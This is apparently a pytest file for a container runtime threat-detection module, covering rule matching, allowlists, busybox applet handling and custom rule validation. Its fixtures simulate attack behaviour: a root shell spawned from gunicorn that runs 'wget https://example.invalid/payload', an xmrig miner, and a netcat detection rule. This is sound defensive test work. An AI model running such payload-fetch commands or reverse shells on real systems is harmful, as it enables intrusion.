from __future__ import annotations

from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone

import pytest

from porygon_api.detection import (
    MATCHER_REVISION,
    RULESET_VERSION,
    allowlist_set_hash,
    build_allowlist_matcher_hash,
    build_detection_run_key,
    confidence_level,
    custom_ruleset_hash,
    evaluate_detection,
    ruleset_hash,
    severity_level,
    validate_custom_condition,
)


@dataclass
class Profile:
    image_digest: str = "example/app@sha256:" + "a" * 64
    features: dict = field(
        default_factory=lambda: {
            "observed_sets": {
                "executables": ["/usr/bin/python", "/usr/bin/gunicorn"],
                "process_names": ["python", "gunicorn"],
                "user_uids": ["1000"],
            }
        }
    )


@dataclass
class Score:
    score_id: str = "00000000-0000-0000-0000-000000000001"
    status: str = "scored"
    total_score: float | None = 0.1
    score_band: str = "baseline_like"
    algorithm_version: str = "porygon.distance.v1"
    window_start: datetime = datetime(2026, 7, 21, 10, 0, tzinfo=timezone.utc)
    window_end: datetime = datetime(2026, 7, 21, 10, 1, tzinfo=timezone.utc)


@dataclass
class ProcessEvent:
    event_id: str
    occurred_at: datetime
    container_id: str | None
    process_name: str | None
    executable: str | None
    parent_name: str | None = None
    parent_executable: str | None = None
    command_line: str | None = None
    user_uid: int | None = 1000
    parent_event_id: str | None = None


@dataclass
class Allowlist:
    allowlist_id: str
    matcher_hash: str
    rule_id: str
    executable: str | None
    parent_executable: str | None = None
    expires_at: datetime | None = None


@dataclass
class RuntimeEvent:
    event_id: str
    occurred_at: datetime
    container_id: str | None
    event_type: str
    action: str
    command: str | None = None
    image_digest: str | None = None
    container_snapshot: dict = field(default_factory=dict)


def test_baseline_like_known_process_has_no_detection_findings() -> None:
    score = Score()
    event = ProcessEvent(
        event_id="p1",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="python",
        executable="/usr/bin/python",
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[event],
        runtime_events=[],
    )

    assert result["status"] == "no_findings"
    assert result["incident_eligible"] is False
    assert result["matches"] == []
    assert result["anomaly_score"] == pytest.approx(0.1)


def test_unseen_root_shell_to_tool_chain_creates_explainable_incident_signal() -> None:
    score = Score(total_score=0.82, score_band="extreme")
    shell = ProcessEvent(
        event_id="p-shell",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="sh",
        executable="/bin/sh",
        parent_name="gunicorn",
        parent_executable="/usr/bin/gunicorn",
        user_uid=0,
    )
    tool = ProcessEvent(
        event_id="p-tool",
        occurred_at=score.window_start + timedelta(seconds=20),
        container_id="c1",
        process_name="wget",
        executable="/usr/bin/wget",
        parent_name="sh",
        parent_executable="/bin/sh",
        command_line="wget https://example.invalid/payload",
        user_uid=0,
        parent_event_id="p-shell",
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[shell, tool],
        runtime_events=[],
    )

    rule_ids = {item["rule_id"] for item in result["matches"]}
    assert {"POR-DET-001", "POR-DET-002", "POR-DET-003", "POR-DET-004", "POR-DET-005"}.issubset(rule_ids)
    assert result["status"] == "incident_created"
    assert result["incident_eligible"] is True
    assert result["severity_score"] >= 0.75
    assert 0.0 <= result["confidence_score"] <= 1.0
    assert result["severity_score"] != result["confidence_score"]


def test_busybox_applets_use_process_name_for_detection_identity() -> None:
    score = Score(total_score=0.35, score_band="elevated")
    shell = ProcessEvent(
        event_id="busybox-shell",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="sh",
        executable="/bin/busybox",
        user_uid=0,
    )
    tool = ProcessEvent(
        event_id="busybox-tool",
        occurred_at=score.window_start + timedelta(seconds=10),
        container_id="c1",
        process_name="base64",
        executable="/bin/busybox",
        parent_name="sh",
        parent_executable="/bin/busybox",
        user_uid=0,
        parent_event_id="busybox-shell",
    )

    profile = Profile()
    profile.features["observed_sets"]["executables"].append("/bin/busybox")
    result = evaluate_detection(
        anomaly_score=score,
        profile=profile,
        process_events=[shell, tool],
        runtime_events=[],
    )

    rule_ids = {item["rule_id"] for item in result["matches"]}
    assert {"POR-DET-002", "POR-DET-004", "POR-DET-005"}.issubset(rule_ids)
    assert result["status"] == "incident_created"
    tool_match = next(item for item in result["matches"] if item["rule_id"] == "POR-DET-004")
    assert tool_match["details"]["executable"] == "base64"
    assert tool_match["details"]["raw_executable"] == "/bin/busybox"


def test_busybox_multicall_dispatch_resolves_identity_from_cmdline() -> None:
    """proc.name/proc.exepath never change on a real busybox dispatch (no exec()),

    so identity has to come from proc.cmdline's second token, not process_name."""
    score = Score(total_score=0.29, score_band="elevated")
    tool = ProcessEvent(
        event_id="busybox-real-dispatch",
        occurred_at=score.window_start + timedelta(seconds=10),
        container_id="c1",
        process_name="busybox",
        executable="/bin/busybox",
        command_line="busybox wget https://example.invalid/payload",
        user_uid=1000,
    )

    profile = Profile()
    profile.features["observed_sets"]["executables"].append("/bin/busybox")
    result = evaluate_detection(
        anomaly_score=score,
        profile=profile,
        process_events=[tool],
        runtime_events=[],
    )

    tool_match = next(item for item in result["matches"] if item["rule_id"] == "POR-DET-004")
    assert tool_match["details"]["executable"] == "wget"
    assert tool_match["details"]["raw_executable"] == "/bin/busybox"


def test_previously_unseen_executable_is_caught_regardless_of_fixed_name_lists() -> None:
    """A novel-named binary (e.g. a miner or DNS tool) is not on any fixed list,

    so detection must key on baseline novelty, not name membership."""
    score = Score(total_score=0.387, score_band="elevated")
    miner = ProcessEvent(
        event_id="p-miner",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="xmrig",
        executable="/opt/xmrig/xmrig",
        user_uid=0,
    )
    dns_tool = ProcessEvent(
        event_id="p-dns",
        occurred_at=score.window_start + timedelta(seconds=6),
        container_id="c2",
        process_name="nslookup",
        executable="/usr/bin/nslookup",
        parent_name="containerd-shim",
        parent_executable="/usr/bin/containerd-shim",
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[miner, dns_tool],
        runtime_events=[],
    )

    rule_ids_by_source: dict[str, set[str]] = {}
    for item in result["matches"]:
        rule_ids_by_source.setdefault(item["source_id"], set()).add(item["rule_id"])
    assert "POR-DET-004" in rule_ids_by_source["p-miner"]
    assert rule_ids_by_source["p-dns"] == {"POR-DET-004"}
    assert result["incident_eligible"] is True


def test_busybox_allowlist_is_applet_exact() -> None:
    score = Score(total_score=0.35, score_band="elevated")
    base64_event = ProcessEvent(
        event_id="busybox-base64",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="base64",
        executable="/bin/busybox",
    )
    wget_event = ProcessEvent(
        event_id="busybox-wget",
        occurred_at=score.window_start + timedelta(seconds=10),
        container_id="c1",
        process_name="wget",
        executable="/bin/busybox",
    )
    allowlist = Allowlist(
        allowlist_id="00000000-0000-0000-0000-000000000100",
        matcher_hash=build_allowlist_matcher_hash(
            image_digest=Profile().image_digest,
            rule_id="POR-DET-004",
            executable="base64",
            parent_executable=None,
        ),
        rule_id="POR-DET-004",
        executable="base64",
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[base64_event, wget_event],
        runtime_events=[],
        allowlists=[allowlist],
    )

    assert [item["details"]["executable"] for item in result["matches"]] == ["wget"]
    assert [item["details"]["executable"] for item in result["suppressed_matches"]] == ["base64"]


def test_docker_exec_is_informational_without_stronger_evidence() -> None:
    score = Score(total_score=0.2, score_band="baseline_like")
    runtime = RuntimeEvent(
        event_id="r1",
        occurred_at=score.window_start + timedelta(seconds=10),
        container_id="c1",
        event_type="container",
        action="exec_start",
        command="echo test",
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[],
        runtime_events=[runtime],
    )

    assert result["status"] == "findings_only"
    assert result["incident_eligible"] is False
    assert [item["rule_id"] for item in result["matches"]] == ["POR-DET-006"]


def test_insufficient_score_never_creates_an_incident() -> None:
    score = Score(status="insufficient_data", total_score=None, score_band="insufficient_data")
    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[],
        runtime_events=[],
    )

    assert result["status"] == "insufficient_data"
    assert result["incident_eligible"] is False
    assert result["severity_score"] is None


def test_ruleset_and_run_keys_are_deterministic_and_versioned() -> None:
    assert RULESET_VERSION == "porygon.detection.v1"
    assert MATCHER_REVISION == "porygon.detection.matcher.v4"
    assert len(ruleset_hash()) == 64
    empty_hash = allowlist_set_hash([])
    first = build_detection_run_key("00000000-0000-0000-0000-000000000001", empty_hash)
    second = build_detection_run_key("00000000-0000-0000-0000-000000000001", empty_hash)
    changed_score = build_detection_run_key("00000000-0000-0000-0000-000000000002", empty_hash)
    changed_allowlists = build_detection_run_key(
        "00000000-0000-0000-0000-000000000001",
        "f" * 64,
    )
    assert first == second
    assert first != changed_score
    assert first != changed_allowlists


def test_severity_and_confidence_bands_are_explicit() -> None:
    assert severity_level(0.0) == "low"
    assert severity_level(0.25) == "medium"
    assert severity_level(0.5) == "high"
    assert severity_level(0.75) == "critical"
    assert confidence_level(0.0) == "low"
    assert confidence_level(0.35) == "medium"
    assert confidence_level(0.70) == "high"


def test_high_distance_alone_is_informational_not_an_incident() -> None:
    score = Score(total_score=0.9, score_band="extreme")
    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[],
        runtime_events=[],
    )
    assert result["status"] == "findings_only"
    assert result["incident_eligible"] is False
    assert [item["rule_id"] for item in result["matches"]] == ["POR-DET-001"]


def test_digest_scoped_exact_allowlist_suppresses_only_matching_shell() -> None:
    score = Score(total_score=0.2, score_band="baseline_like")
    shell = ProcessEvent(
        event_id="p-shell",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="sh",
        executable="/bin/sh",
        parent_name="gunicorn",
        parent_executable="/usr/bin/gunicorn",
        user_uid=1000,
    )
    matcher_hash = build_allowlist_matcher_hash(
        image_digest=Profile().image_digest,
        rule_id="POR-DET-002",
        executable="/bin/sh",
        parent_executable="/usr/bin/gunicorn",
    )
    allowlist = Allowlist(
        allowlist_id="00000000-0000-0000-0000-000000000099",
        matcher_hash=matcher_hash,
        rule_id="POR-DET-002",
        executable="/bin/sh",
        parent_executable="/usr/bin/gunicorn",
    )
    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[shell],
        runtime_events=[],
        allowlists=[allowlist],
    )
    assert result["status"] == "no_findings"
    assert result["matches"] == []
    assert result["suppressed_matches"][0]["rule_id"] == "POR-DET-002"
    assert result["suppressed_matches"][0]["suppressed_by_allowlist_id"] == allowlist.allowlist_id

    other_shell = ProcessEvent(
        event_id="p-other",
        occurred_at=score.window_start + timedelta(seconds=10),
        container_id="c2",
        process_name="bash",
        executable="/bin/bash",
        parent_name="gunicorn",
        parent_executable="/usr/bin/gunicorn",
        user_uid=1000,
    )
    other_result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[other_shell],
        runtime_events=[],
        allowlists=[allowlist],
    )
    assert other_result["status"] == "incident_created"
    assert other_result["matches"][0]["rule_id"] == "POR-DET-002"


def _custom_rule(**overrides: object) -> dict:
    rule = {
        "slug": "nc-listener",
        "name": "Netcat listener spawned",
        "category": "custom",
        "description": "Flags any execution of nc.",
        "target": "process",
        "condition": {"field": "executable", "op": "equals", "value": "nc", "scope": "event"},
        "severity_weight": 0.8,
        "confidence_weight": 0.9,
        "incident_eligible": True,
        "enabled": True,
    }
    rule.update(overrides)
    return rule


def test_validate_custom_condition_accepts_valid_trees_and_rejects_unsafe_ones() -> None:
    validate_custom_condition(
        {"all": [{"field": "executable", "op": "equals", "value": "nc", "scope": "event"}]},
        target="process",
    )
    validate_custom_condition(
        {"field": "privileged", "op": "equals", "value": True, "scope": "event"},
        target="runtime",
    )

    with pytest.raises(ValueError):
        validate_custom_condition({"field": "not_a_real_field", "op": "equals", "value": 1}, target="process")
    with pytest.raises(ValueError):
        validate_custom_condition({"field": "executable", "op": "not_a_real_op", "value": 1}, target="process")
    with pytest.raises(ValueError):
        validate_custom_condition(
            {"field": "privileged", "op": "equals", "value": True, "scope": "ancestor"},
            target="runtime",
        )
    with pytest.raises(ValueError):
        validate_custom_condition({"all": []}, target="process")
    with pytest.raises(ValueError):
        deep = {"field": "executable", "op": "equals", "value": "nc"}
        for _ in range(10):
            deep = {"not": deep}
        validate_custom_condition(deep, target="process")


def test_custom_rule_matches_and_captures_process_chain() -> None:
    score = Score(total_score=0.1, score_band="baseline_like")
    shell = ProcessEvent(
        event_id="p-shell",
        occurred_at=score.window_start + timedelta(seconds=1),
        container_id="c1",
        process_name="sh",
        executable="/bin/sh",
        parent_name="gunicorn",
        parent_executable="/usr/bin/gunicorn",
        user_uid=1000,
    )
    nc = ProcessEvent(
        event_id="p-nc",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="nc",
        executable="/usr/bin/nc",
        parent_name="sh",
        parent_executable="/bin/sh",
        user_uid=1000,
        parent_event_id="p-shell",
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[shell, nc],
        runtime_events=[],
        custom_rules=[_custom_rule()],
    )

    custom_matches = [item for item in result["matches"] if item["rule_id"] == "POR-CUS-nc-listener"]
    assert len(custom_matches) == 1
    match = custom_matches[0]
    assert match["incident_eligible"] is True
    chain = match["details"]["process_chain"]
    assert [node["event_id"] for node in chain] == ["p-nc", "p-shell"]
    assert result["incident_eligible"] is True


def test_custom_rules_never_change_the_built_in_ruleset_hash() -> None:
    score = Score(total_score=0.1, score_band="baseline_like")
    without_custom = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[],
        runtime_events=[],
    )
    with_custom = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[],
        runtime_events=[],
        custom_rules=[_custom_rule()],
    )
    assert without_custom["ruleset_hash"] == with_custom["ruleset_hash"] == ruleset_hash()
    assert without_custom["custom_ruleset_hash"] != with_custom["custom_ruleset_hash"]
    assert without_custom["custom_ruleset_hash"] == custom_ruleset_hash([])
    assert with_custom["custom_ruleset_hash"] == custom_ruleset_hash([_custom_rule()])


def test_build_detection_run_key_changes_when_custom_ruleset_changes() -> None:
    empty_hash = allowlist_set_hash([])
    base = build_detection_run_key("00000000-0000-0000-0000-000000000001", empty_hash, "")
    changed = build_detection_run_key(
        "00000000-0000-0000-0000-000000000001",
        empty_hash,
        custom_ruleset_hash([_custom_rule()]),
    )
    assert base != changed


def test_custom_ruleset_hash_changes_when_only_target_differs() -> None:
    process_rule = _custom_rule(target="process")
    runtime_rule = _custom_rule(target="runtime")
    assert custom_ruleset_hash([process_rule]) != custom_ruleset_hash([runtime_rule])


def test_custom_ruleset_hash_changes_when_only_name_differs() -> None:
    rule_a = _custom_rule(name="Rule A")
    rule_b = _custom_rule(name="Rule B")
    assert custom_ruleset_hash([rule_a]) != custom_ruleset_hash([rule_b])


def test_custom_ruleset_hash_is_order_independent() -> None:
    rule_a = _custom_rule(slug="rule-a")
    rule_b = _custom_rule(slug="rule-b")
    assert custom_ruleset_hash([rule_a, rule_b]) == custom_ruleset_hash([rule_b, rule_a])


def test_a_malformed_custom_rule_does_not_crash_detection_for_other_rules() -> None:
    score = Score(total_score=0.1, score_band="baseline_like")
    event = ProcessEvent(
        event_id="p-nc",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="nc",
        executable="/usr/bin/nc",
    )
    good_rule = _custom_rule()
    corrupt_rule = _custom_rule(
        slug="corrupt-rule",
        # Missing the required 'value' key: a bad migration, direct SQL edit, or a
        # future relaxed validator could produce a row shaped like this.
        condition={"field": "executable", "op": "equals", "scope": "event"},
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[event],
        runtime_events=[],
        custom_rules=[good_rule, corrupt_rule],
    )

    matched_rule_ids = {item["rule_id"] for item in result["matches"]}
    assert "POR-CUS-nc-listener" in matched_rule_ids
    assert result["incident_eligible"] is True
    assert len(result["rule_errors"]) == 1
    assert result["rule_errors"][0]["slug"] == "corrupt-rule"
    assert result["rule_errors"][0]["rule_id"] == "POR-CUS-corrupt-rule"


def test_custom_rule_user_uid_string_value_matches_integer_uid_field() -> None:
    score = Score(total_score=0.1, score_band="baseline_like")
    event = ProcessEvent(
        event_id="p-root",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="whoami",
        executable="/usr/bin/whoami",
        user_uid=0,
    )
    rule = _custom_rule(
        slug="root-uid-string",
        condition={"field": "user_uid", "op": "equals", "value": "0", "scope": "event"},
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[event],
        runtime_events=[],
        custom_rules=[rule],
    )

    matched = [item for item in result["matches"] if item["rule_id"] == "POR-CUS-root-uid-string"]
    assert len(matched) == 1


def test_custom_rule_user_uid_string_list_matches_integer_uid_field() -> None:
    score = Score(total_score=0.1, score_band="baseline_like")
    event = ProcessEvent(
        event_id="p-root",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="whoami",
        executable="/usr/bin/whoami",
        user_uid=0,
    )
    rule = _custom_rule(
        slug="root-uid-in-list",
        condition={"field": "user_uid", "op": "in", "value": ["0", "1"], "scope": "event"},
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[event],
        runtime_events=[],
        custom_rules=[rule],
    )

    matched = [item for item in result["matches"] if item["rule_id"] == "POR-CUS-root-uid-in-list"]
    assert len(matched) == 1


def test_disabled_custom_rule_is_skipped() -> None:
    score = Score(total_score=0.1, score_band="baseline_like")
    event = ProcessEvent(
        event_id="p-nc",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="nc",
        executable="/usr/bin/nc",
    )
    rule = _custom_rule(enabled=False)

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[event],
        runtime_events=[],
        custom_rules=[rule],
    )

    assert all(item["rule_id"] != "POR-CUS-nc-listener" for item in result["matches"])


def test_custom_rule_ancestor_scope_matches_against_process_chain() -> None:
    score = Score(total_score=0.1, score_band="baseline_like")
    shell = ProcessEvent(
        event_id="p-shell",
        occurred_at=score.window_start + timedelta(seconds=1),
        container_id="c1",
        process_name="sh",
        executable="/bin/sh",
    )
    child = ProcessEvent(
        event_id="p-child",
        occurred_at=score.window_start + timedelta(seconds=2),
        container_id="c1",
        process_name="wget",
        executable="/usr/bin/wget",
        parent_event_id="p-shell",
    )
    rule = _custom_rule(
        slug="ancestor-shell",
        condition={"field": "executable", "op": "equals", "value": "sh", "scope": "ancestor"},
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[shell, child],
        runtime_events=[],
        custom_rules=[rule],
    )

    matched_source_ids = {
        item["source_id"] for item in result["matches"] if item["rule_id"] == "POR-CUS-ancestor-shell"
    }
    assert matched_source_ids == {"p-child"}


def test_ancestor_chain_cycle_does_not_infinite_loop() -> None:
    score = Score(total_score=0.1, score_band="baseline_like")
    node_a = ProcessEvent(
        event_id="p-a",
        occurred_at=score.window_start + timedelta(seconds=1),
        container_id="c1",
        process_name="toola",
        executable="/usr/bin/toola",
        parent_event_id="p-b",
    )
    node_b = ProcessEvent(
        event_id="p-b",
        occurred_at=score.window_start + timedelta(seconds=2),
        container_id="c1",
        process_name="toolb",
        executable="/usr/bin/toolb",
        parent_event_id="p-a",
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[node_a, node_b],
        runtime_events=[],
    )

    match_b = next(
        item
        for item in result["matches"]
        if item["rule_id"] == "POR-DET-004" and item["source_id"] == "p-b"
    )
    chain_ids = [node["event_id"] for node in match_b["details"]["process_chain"]]
    # Bounded despite the parent_event_id cycle (p-a <-> p-b): the walk must terminate
    # rather than looping until it hits CUSTOM_ANCESTOR_MAX_DEPTH.
    assert chain_ids[0] == "p-b"
    assert len(chain_ids) <= 3


def test_custom_rule_runtime_target_matches_and_captures_action_and_image_digest() -> None:
    score = Score(total_score=0.1, score_band="baseline_like")
    runtime = RuntimeEvent(
        event_id="r-priv",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        event_type="container",
        action="start",
        image_digest="example/app@sha256:" + "b" * 64,
        container_snapshot={"host_config": {"privileged": True}},
    )
    rule = _custom_rule(
        slug="runtime-privileged",
        target="runtime",
        condition={"field": "privileged", "op": "equals", "value": True, "scope": "event"},
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[],
        runtime_events=[runtime],
        custom_rules=[rule],
    )

    match = next(item for item in result["matches"] if item["rule_id"] == "POR-CUS-runtime-privileged")
    assert match["source_type"] == "runtime_event"
    assert match["details"]["action"] == "start"
    assert match["details"]["image_digest"] == runtime.image_digest


def test_busybox_flag_argument_does_not_become_the_applet_name() -> None:
    score = Score(total_score=0.1, score_band="baseline_like")
    event = ProcessEvent(
        event_id="busybox-flag",
        occurred_at=score.window_start + timedelta(seconds=5),
        container_id="c1",
        process_name="busybox",
        executable="/bin/busybox",
        command_line="busybox --help",
    )

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=[event],
        runtime_events=[],
    )

    tool_match = next(item for item in result["matches"] if item["rule_id"] == "POR-DET-004")
    assert tool_match["details"]["executable"] == "busybox"


def test_por_det_004_matches_are_capped_per_detection_window() -> None:
    score = Score(total_score=0.1, score_band="baseline_like")
    events = [
        ProcessEvent(
            event_id=f"p-tool-{i}",
            occurred_at=score.window_start + timedelta(seconds=i),
            container_id="c1",
            process_name=f"tool{i}",
            executable=f"/usr/bin/tool{i}",
        )
        for i in range(15)
    ]

    result = evaluate_detection(
        anomaly_score=score,
        profile=Profile(),
        process_events=events,
        runtime_events=[],
    )

    det004_matches = [item for item in result["matches"] if item["rule_id"] == "POR-DET-004"]
    assert len(det004_matches) == 10
    assert result["metrics"]["additional_unseen_executables"] == 5
